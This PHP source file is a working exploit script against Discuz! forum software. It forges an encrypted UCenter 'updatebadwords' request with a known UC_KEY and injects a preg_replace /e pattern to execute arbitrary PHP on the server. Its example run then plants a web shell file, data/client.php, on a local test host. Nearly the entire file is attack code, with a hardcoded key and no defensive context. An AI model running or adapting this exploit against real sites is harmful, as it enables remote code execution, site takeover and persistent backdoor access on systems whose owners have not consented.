<?php

   class Discuz {
      public function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {

         $ckey_length = 4;

         $key = md5($key ? $key : UC_KEY);
         $keya = md5(substr($key, 0, 16));
         $keyb = md5(substr($key, 16, 16));
         $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

         $cryptkey = $keya.md5($keya.$keyc);
         $key_length = strlen($cryptkey);

         $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
         $string_length = strlen($string);

         $result = '';
         $box = range(0, 255);

         $rndkey = array();
         for($i = 0; $i <= 255; $i++) {
            $rndkey[$i] = ord($cryptkey[$i % $key_length]);
         }

         for($j = $i = 0; $i < 256; $i++) {
            $j = ($j + $box[$i] + $rndkey[$i]) % 256;
            $tmp = $box[$i];
            $box[$i] = $box[$j];
            $box[$j] = $tmp;
         }

         for($a = $j = $i = 0; $i < $string_length; $i++) {
            $a = ($a + 1) % 256;
            $j = ($j + $box[$a]) % 256;
            $tmp = $box[$a];
            $box[$a] = $box[$j];
            $box[$j] = $tmp;
            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
         }

         if($operation == 'DECODE') {
            if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
               return substr($result, 26);
            } else {
               return '';
            }
         } else {
            return $keyc.str_replace('=', '', base64_encode($result));
         }
      }

      public function post ($url, $postdata) {
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         $data = curl_exec ($ch);
         curl_close ($ch);

         return $data;
      }

      public function get ($url) {
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         $data = curl_exec ($ch);
         curl_close ($ch);

         return $data;
      }

      public function getFormHash ($dz_url) {
         $data = $this->get ("$dz_url/forum.php");
         foreach (explode ('&', $data) as $item) {
            if (preg_match ('/formhash=(\w+)/', $item, $matches)) {
                return $matches[1];
            }
         }

         return null;
      }

      public function hack ($dz_url, $uc_key, $phpcode) {
         $formhash = $this->getFormHash ($dz_url);
         if (! $formhash) {
            die ("cannot get formhash");
         }

         $uc_code  = $this->authcode ('time=' . time() . '&action=updatebadwords', 'ENCODE', $uc_key);
         $postdata = '<?xml version="1.0" encoding="ISO-8859-1"?><root><item id="balabala"><item id="findpattern">/hackedbyme/e</item><item id="replacement">' . $phpcode . '</item></item></root>';
         $data = $this->post ("$dz_url/api/uc.php?formhash=$formhash&code=$uc_code", $postdata);

         if ($data == "1") {
            $blockStr = $this->get ("$dz_url/forum.php?mod=ajax&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=checkusername&username=hackedbyme");
            if (strstr ($blockStr, '含被系统屏蔽') != -1) {
               return array (true, null);
            } else {
               return array (false, 'badwords 失败');
            }
         }

         return array (false, $data);
      }
   };

   $webshell = '<?php phpinfo(); ?>';

   $dz = new Discuz ();
   list ($status, $data) = $dz->hack (
      'http://ubuntu64/dz/',
      'K856C548X2xaTcDdc248I1pc57gdq4vdL2SdH3ifGd4a0ec6UdcfX0B7m9Ubrcs4', 
      'file_put_contents("data/client.php", base64_decode ("' . base64_encode ($webshell) . '"));'
   );

   echo $status, "\n";
   echo $data, "\n";
   
?>
